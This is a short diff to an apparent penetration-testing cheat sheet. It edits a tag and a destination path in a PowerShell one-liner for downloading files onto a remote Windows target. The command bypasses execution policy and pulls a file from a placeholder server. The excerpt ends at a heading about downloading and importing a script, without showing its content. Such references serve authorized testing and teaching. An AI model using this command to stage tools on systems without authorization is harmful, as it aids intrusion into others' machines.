@@ -2,12 +2,12 @@
 
 % powershell, download
 
-#plateform/windows #target/remote #cat/UTIL/FILE_TRANSFERT #tag/powershell 
+#plateform/windows #target/remote #cat/UTILS/FILE_TRANSFERT #tag/powershell 
 
 ## file transfert - download on disk
 
 ```powershell
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<windows_writable_path>/<dest_file>')"
 ```
 
 ## file transfert - download and import script
